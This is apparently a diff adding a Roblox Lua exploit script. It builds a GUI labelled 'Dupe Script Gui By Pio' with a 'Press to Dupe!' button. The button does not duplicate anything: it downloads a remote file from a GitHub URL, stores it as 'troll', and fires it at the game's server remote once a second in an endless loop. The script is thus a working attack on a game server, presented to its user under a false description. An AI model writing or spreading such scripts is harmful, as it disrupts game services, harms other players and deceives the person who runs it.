@@ -1,0 +1,54 @@
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local Label = Instance.new("TextLabel")
+local label = Instance.new("TextLabel")
+local button = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(79, 79, 79)
+main.Position = UDim2.new(0.362042129, 0, 0.352945626, 0)
+main.Size = UDim2.new(0, 154, 0, 126)
+main.Active = true
+main.Draggable = true 
+
+Label.Name = "Label"
+Label.Parent = main
+Label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Label.Size = UDim2.new(0, 154, 0, 36)
+Label.Font = Enum.Font.SourceSans
+Label.Text = "Dupe Script Gui By Pio"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.TextSize = 14.000
+
+label.Name = "label"
+label.Parent = main
+label.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
+label.Position = UDim2.new(0, 0, 0.285714298, 0)
+label.Size = UDim2.new(0, 154, 0, 25)
+label.Font = Enum.Font.SourceSans
+label.Text = "5 Mins No ERROR!"
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextSize = 14.000
+
+button.Name = "button"
+button.Parent = main
+button.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
+button.Position = UDim2.new(0.19480519, 0, 0.56349206, 0)
+button.Size = UDim2.new(0, 93, 0, 45)
+button.Font = Enum.Font.SourceSans
+button.Text = "Press to Dupe!"
+button.TextColor3 = Color3.fromRGB(0, 0, 0)
+button.TextSize = 14.000
+button.MouseButton1Down:connect(function()
+	local troll = game:HttpGet("https://raw.githubusercontent.com/Pio092707/dump/main/UwU.lua")
+
+	while task.wait(1.0) do
+		workspace.__THINGS.__REMOTES.MAIN:FireServer("b", troll)
+	end
+end)
